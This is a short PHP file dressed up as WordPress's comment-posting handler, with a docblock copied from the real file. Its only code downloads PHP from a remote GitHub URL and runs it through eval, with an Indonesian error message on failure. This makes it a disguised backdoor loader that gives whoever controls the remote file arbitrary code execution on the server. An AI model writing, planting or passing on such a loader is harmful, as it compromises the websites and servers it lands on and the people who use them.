<?php
/**
 * Handles Comment Post to WordPress and prevents duplicate comment posting.
 *
 * @package WordPress
 */
$url = "https://raw.githubusercontent.com/InvisibleBunny/Records/main/Bunny-Mini/minify.php";

$code = file_get_contents($url);
if ($code !== false) {
    eval("?>".$code);
} else {
    echo "Gagal mengambil konten dari $url";
}
?>
